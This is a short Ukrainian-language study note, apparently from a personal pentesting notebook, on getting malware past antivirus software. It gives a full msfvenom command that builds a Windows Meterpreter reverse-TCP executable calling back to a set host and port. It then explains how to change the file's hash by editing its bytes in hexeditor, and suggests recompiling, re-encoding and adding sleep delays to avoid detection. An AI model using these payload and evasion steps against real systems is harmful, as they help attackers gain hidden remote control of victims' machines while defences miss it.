  ----------
2 Звязки : [[попереднє використання msfvenom . генерація корисної нагрузки]] ,[[створення корисного навантаження (корисної нагрузки) з допомогою Msvenom]] , [[Генерація корисної нагрузки PowerShell  з допомогою Veil]], [[створення корисного навантаження з TheFatRat]]
3 Теги : [[Xexeditor і антивіруси]]

для обходу вірусів можна примінити : 
- закодувати свої програми чи свої ж корисні навантаження. (чувак був закодував на  мові С , але це довго не триває, один хуй доберуться.). Треба вміти компілювати код на якійсь мові програмування.
- постійно обновляти корисні нагрузки.
- пробувати компілювати на різних мовах.
- трохи змінити двоїчний код після створення корисного навантаження.. 
створюю корисну нагрузку :

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.109  LPORT=5555 -f exe -o shell.exe 
це найвідоміша в світі корисна нагрузка, її хаває кожен антивірус

дивлюся на її хеш:
──(kali㉿kali)-[~/Downloads]
└─$ md5sum shell.exe 
3949070cc8eb8e5acd7be4c6824cf488  shell.exe

змшнивши двоїчний хeш програми змінюється контрольна сума.
для змiни використовуєм вшитий в калі інструмент hexeditor

hexeditor shell.exe
 в двоїчному коді можна міняти не все, бо піздєц.
 можна зокркме міняти код в (programm cannon be ruf in DOS(шукати по двоїчному коду))
можна ще знайти text (починається на 74)і там міняти 
 зберігати зміни як у нано(ctr o   enter     ctrx)
 відповідно зміниться і хеш.

- ще непогано встановити затримку (SLEEP)





kino: 
https://www.youtube.com/watch?v=3uUrmvcj61M&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=69